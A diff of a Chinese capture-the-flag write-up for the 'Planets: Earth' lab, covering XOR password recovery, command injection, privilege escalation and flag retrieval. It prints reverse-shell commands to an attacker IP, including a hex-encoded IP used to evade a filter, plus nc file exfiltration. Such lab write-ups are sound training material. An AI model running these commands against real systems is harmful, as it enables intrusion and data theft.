@@ -1,9 +1,13 @@
----
-title: "The planets earth"
-date: 2026-03-11
-draft: false
-weight: 1
----
++++
+title = "The planets earth"
+date = 2026-03-11
+draft = false
+weight = 1
+tags = ["XOR脚本", "命令注入", "绕过", "SUID提权", "逆向分析"]
++++
+
+# 总结
+信息收集发现web服务和管理后台，利用xor加密特性破解管理员密码，成功获取用户权限并通过16位转换绕过反弹shell，通过分析SUID文件并创建触发器文件提权到root
 
 # 一、信息收集
 ## 1.1 端口信息收集
@@ -86,7 +90,10 @@ gobuster dir -u http://earth.local -w /usr/share/dirb/wordlists/common.txt
 gobuster dir -u https://terratest.earth.local -w /usr/share/dirb/wordlists/common.txt -k
 ```
 
+- 其中`-k`忽略证书问题引起的验证错误，继续连接
+
 结果有如下内容，接着访问`https//terratest.earth.local/robots.txt`
+
 ```
 /index.html           (Status: 200) [Size: 26]
 /robots.txt           (Status: 200) [Size: 521]
@@ -148,10 +155,10 @@ hex_data = "2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d10
 # 第二段数据（文本字符串）
 text_data = "According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth's history, life appeared in the oceans and began to affect Earth's atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago."
 
-# 将十六进制字符串转换为字节数组
+# 将16进制字符串转为原始2进制字节
 data1 = bytes.fromhex(hex_data)
 
-# 将文本字符串转换为字节数组（UTF-8 编码）
+# 将参考文本转为2进制字节
 data2 = text_data.encode('utf-8')
 
 # 对 data2 进行循环填充，使其长度与 data1 一致
@@ -193,7 +200,16 @@ Command output: [user_flag_3353b67d6437f07ba7d34afd7d2fc27d]
 
 ## 2.3 反弹shell
 尝试直接使用反弹shell，在kali中监听`nc -lvnp 7777`，接着命令注入`bash -i >& /dev/tcp/192.168.174.131/7777 0>&1`，但被拦截
-尝试将IP转换为十六进制格式，`bash -i >& /dev/tcp/0xc0a8ae83/7777 0>&1`，成功反弹。
+尝试将IP转换为十六进制格式，创建一个python脚本，
+```python
+import socket
+print(socket.inet_aton('192.168.203.129').hex().upper())
+```
+  - `inet_aton`(即Internet Address to Network format，将互联网地址转换为网络字节序)，4字节原始二进制数据，得到的是一个`bytes`对象`b'\xc0\xa8\...\...`
+  - `.hex()`将二进制字节转换为十六进制
+  - `.upper()`将所有字母转换成大写
+得到`C0A8AE83`，在前面加上0x，符合十六进制整数规范
+注入`bash -i >& /dev/tcp/0xC0A8AE83/7777 0>&1`，成功反弹。
 
 # 三、提权
 ## 3.1 查找可提权命令
@@ -214,16 +230,18 @@ RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.
 ```shell
 # kali，输出重定向，将接收到的网络数据保存到名为reset_root的新文件中
 nc -lnvp 7777 > reset_root
-# 靶机，输入重定向，将靶机原本有的reset_root文件内容喂给nc，通过网络发出去
-nc 192.168.174.131 7777 < /usr/bin/reset_root
+# 反弹来的靶机的shell中，输入重定向，将靶机原本有的reset_root文件内容喂给nc，通过网络发出去
+nc 192.168.203.129 7777 < /usr/bin/reset_root
 ```
 
-使用strace调试，`sudo strace ./reset root`，发现没有如下文件：
+赋予执行权限，使用strace调试，`sudo strace ./reset_root`，发现没有如下文件：
 ```ZSH
+chmod +x ./reset_root
 access("/dev/shm/kHgTFI5G", F_OK)       = -1 ENOENT (No such file or directory)
 access("/dev/shm/Zw7bV9U5", F_OK)       = -1 ENOENT (No such file or directory)
 access("/tmp/kcM0Wewe", F_OK)           = -1 ENOENT (No such file or directory)
 ```
+这是程序在询问内核，这个文件是否存在，内核回答不存在，由于这三个文件都不存在，程序走到了`RESET FAILED`的逻辑
 
 于是靶机上创建这三个文件，再次运行reset_root
 ```ZSH
@@ -238,6 +256,3 @@ CHECKING IF RESET TRIGGERS PRESENT...
 RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth
 ```
 得到了root密码`Earth`，使用`su root`切换为root模式，再`cd /root`，`cat root_flag.txt`，得到最终flag`[root_flag_b0da9554d29db2117b02aa8b66ec492e]`
-
-# 四、总结
-信息收集发现web服务和管理后台，利用xor加密特性破解管理员密码，成功获取用户权限并反弹shell，通过分析SUID文件并创建触发器文件提权到root
